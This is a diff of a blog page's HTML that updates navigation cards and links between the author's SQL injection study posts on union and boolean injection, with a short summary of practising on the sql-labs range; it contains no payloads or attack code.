-                    <a href="http://wkaiblog.cn/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/">http://wkaiblog.cn/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/</a>
+                    <a href="http://wkaiblog.cn/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/">http://wkaiblog.cn/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -687,9 +713,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
@@ -720,9 +747,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -735,6 +762,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -745,31 +773,25 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">
+                <a href="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/">
                     <div class="card-image">
                         
-                        <img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" class="responsive-img" alt="（三）SQL注入—联合注入原理">
+                        <img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" class="responsive-img" alt="（三）SQL注入—联合注入实操">
                         
-                        <span class="card-title">（三）SQL注入—联合注入原理</span>
+                        <span class="card-title">（三）SQL注入—联合注入实操</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。
-首先列出测试用的表结构和数据
-
-
-
-
-
-在参数后
+在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值
+我选择的是靶场sql-labs的第一关
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-18
                             </span>
                         <span class="publish-author">
                             
